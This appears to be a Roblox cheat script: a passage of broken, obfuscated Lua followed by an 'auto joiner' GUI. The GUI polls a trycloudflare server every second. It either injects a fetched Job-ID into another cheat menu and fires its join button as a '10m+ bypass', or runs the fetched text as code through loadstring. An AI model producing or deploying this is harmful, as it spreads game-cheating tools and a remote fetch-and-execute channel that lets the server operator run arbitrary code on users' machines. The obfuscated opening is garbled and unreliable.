g m=1181133-23637 i=i or m end end end else if i<-789694+11544806 then if i<10244646-(-268164)then if i<11271390-902598 then if i<9932261-(-239757)then i=I[g]l=-649751-(-649752)t=304782-304776 b=i(l,t)i=u(552727+-546820)t=u(-563079-(-568986))E[i]=b l=E[t]t=677166-677164 i=l>t i=i and 646634+8283910 or 346154+7836647 else H=350119-350118 m=I[z[317869-317867]]o=m*H m=29629009705044-(-261519)G=o+m o=35184372254617-165785 i=G%o m=-120760-(-120761)I[z[841233+-841231]]=i o=I[z[279477+-279474]]i=911850+7399904 G=o~=m end else f=V(f)j=V(j)n=nil O=V(O)M=V(M)B=V(B)i=-665560+800697 F=V(F)end else if i<11429023-888504 then i=G and 3866041-(-573664)or 4247065-805239 else i=true i=i and 10311446-205097 or 639315+14296783 end end else if i<12572279-144264 then if i<10921860-13436 then M=u(-151670-(-157566))F=D()I[F]=r j=615588-615587 B=433892+-433792 G=E[M]X=46770-46770 M=u(167746+-161830)i=G[M]M=-1014075-(-1014076)G=i(M,B)M=D()O=870326+-870071 I[M]=G B=272576-272576 i=I[g]G=i(B,O)B=D()I[B]=G i=I[g]n=525960+-525958 f=I[M]O=35643+-35642 G=i(O,f)O=D()I[O]=G G=I[g]f=G(j,n)h=958456-948456 G=-136436+136437 n=u(570141+-564256)x=u(985640-979759)i=f==G f=D()G=u(299247+-293373)I[f]=i J=E[x]w=I[g]i=u(-784387-(-790282))U={w(X,h)}x=J(C(U))J=u(1021428-1015543)S=x..J i=p[i]j=n..S i=i(p,G,j)n=u(11996-6097)j=D()I[j]=i S=q(95976+12633466,{g,F,A,H,m;L;f,j,M;O;B,Y})G=E[n]n={G(S)}i={C(n)}n=i i=I[f]i=i and-678651+16315616 or-181970+9908731 else l=u(569894-564012)b=E[l]y=A l=u(859073+-853167)r=b[l]b=r(o,y)r=I[z[991919-991913]]i=605172+8716485 l=r()L=b+l l=20869-20868 p=L+s L=-164205+164461 y=nil T=p%L L=H[m]s=T b=s+l r=d[b]p=L..r H[m]=p end else if i<12684972-(-38173)then i=true i=1041803+7573442 else m=I[z[537800+-537799]]d=-941771+941772 e=-1016353-(-1016355)H=m(d,e)m=-262586+262587 o=H==m i=o and-264813+10796979 or 3728382-(-19126)G=o end end end end else if i<863930+14076180 then if i<13290023-(-547502)then if i<12586911-(-773977)then if i<12972343-(-322281)then if i<-681460+13514549 then G={}i=E[u




local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "JoinerRexzyUI"
gui.ResetOnSpawn = false

-- Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 160, 0, 80)
frame.Position = UDim2.new(0, 20, 0.5, -40)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 25)
title.BackgroundTransparency = 1
title.Text = "Joiner | Rexzy"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

-- Button
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -20, 0, 30)
btn.Position = UDim2.new(0, 10, 0, 35)
btn.BackgroundColor3 = Color3.fromRGB(70, 140, 255)
btn.Text = "Start Auto Join"
btn.TextColor3 = Color3.fromRGB(240, 240, 240)
btn.TextSize = 18
btn.Font = Enum.Font.SourceSansBold
btn.Parent = frame
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

-- 10m+ bypass helpers
local function prints(str)
    print("[AutoJoiner]: " .. str)
end

local function findTargetGui()
    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
        if gui:IsA("ScreenGui") then
            for _, descendant in ipairs(gui:GetDescendants()) do
                if descendant:IsA("TextLabel") and descendant.Text == "Job-ID Input" then
                    return descendant:FindFirstAncestorOfClass("ScreenGui")
                end
            end
        end
    end
end

local function setJobIDText(targetGui, text)
    for _, btn in ipairs(targetGui:GetDescendants()) do
        if btn:IsA("TextButton") then
            local frames = {}
            for _, child in ipairs(btn:GetChildren()) do
                if child:IsA("Frame") then
                    table.insert(frames, child)
                end
            end
            if #frames >= 2 then
                for _, descendant in ipairs(frames[1]:GetDescendants()) do
                    if descendant:IsA("TextLabel") and descendant.Text == "Job-ID Input" then
                        for _, subFrame in ipairs(frames[2]:GetChildren()) do
                            if subFrame:IsA("Frame") then
                                for _, obj in ipairs(subFrame:GetDescendants()) do
                                    if obj:IsA("TextBox") then
                                        obj.Text = text
                                        prints("Textbox updated: " .. text .. " (10m+ bypass)")
                                        return obj
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local function clickJoinButton(targetGui)
    local function findButton(base)
        for _, btn in ipairs(base:GetDescendants()) do
            if btn:IsA("TextButton") then
                for _, content in ipairs(btn:GetDescendants()) do
                    if content:IsA("TextLabel") and content.Text == "Join Job-ID" then
                        return btn
                    end
                end
            end
        end
    end

    local current = targetGui
    for _ = 1, 4 do
        local button = findButton(current)
        if button then return button end
        current = current.Parent
        if not current then break end
    end
end

local function bypass10M(jobId)
    local targetGui = findTargetGui()
    if not targetGui then return end
    setJobIDText(targetGui, jobId)
    local button = clickJoinButton(targetGui)
    if button then
        task.defer(function()
            task.wait(0.05)
            for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
                conn:Fire()
                prints("Join server clicked (10m+ bypass)")
            end
        end)
    end
end

local function justJoin(script)
    local func, err = loadstring(script)
    if func then
        local ok, result = pcall(func)
        if not ok then
            prints("Error while executing script: " .. result)
        end
    else
        prints("Unexpected error: " .. err)
    end
end

-- Main button click logic
btn.MouseButton1Click:Connect(function()
    btn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    btn.Text = "Running..."

    task.spawn(function()
        while true do
            local success, data = pcall(function()
                return game:HttpGet("https://pipeline-pet-workflow-oliver.trycloudflare.com") -- CHANGE URL
            end)
            if success and data and data ~= "" then
                if not string.find(data, "TeleportService") then
                    prints("Bypassing 10m server: " .. data)
                    bypass10M(data)
                else
                    prints("Running script from server")
                    justJoin(data)
                end
            end
            task.wait(1) -- polling interval
        end
    end)
end)
